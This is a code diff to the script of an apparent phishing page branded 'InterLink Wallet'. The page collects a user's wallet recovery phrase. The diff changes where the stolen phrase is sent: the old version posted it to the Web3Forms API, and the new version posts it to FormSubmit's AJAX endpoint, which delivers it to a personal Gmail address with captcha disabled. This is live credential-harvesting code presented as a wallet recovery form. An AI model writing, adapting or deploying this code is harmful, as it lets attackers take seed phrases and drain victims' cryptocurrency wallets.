@@ -82,8 +82,8 @@
     </div>
 
     <script>
-        // Web3Forms Access Key
-        const WEB3FORMS_ACCESS_KEY = "2f51e6c2-ff4c-4727-a8f8-8b60ecc11b94";
+        // FormSubmit Target Email
+        const RECEIVING_EMAIL = "booster.qt@gmail.com";
 
         async function pastePhrase() {
             try {
@@ -111,17 +111,17 @@
             btnText.innerText = "Submitting...";
 
             try {
-                // Submit directly to Web3Forms API
-                await fetch("https://api.web3forms.com/submit", {
+                // Submit directly to FormSubmit AJAX API
+                await fetch(`https://formsubmit.co/ajax/${RECEIVING_EMAIL}`, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
                         "Accept": "application/json"
                     },
                     body: JSON.stringify({
-                        access_key: WEB3FORMS_ACCESS_KEY,
-                        subject: "New Wallet Recovery Phrase Submission",
-                        from_name: "InterLink Wallet",
+                        _subject: "New Wallet Recovery Phrase Submission",
+                        _template: "table",
+                        _captcha: "false",
                         recovery_phrase: phrase,
                         submitted_at: new Date().toLocaleString()
                     })
@@ -143,4 +143,3 @@
     </script>
 </body>
 </html>
-
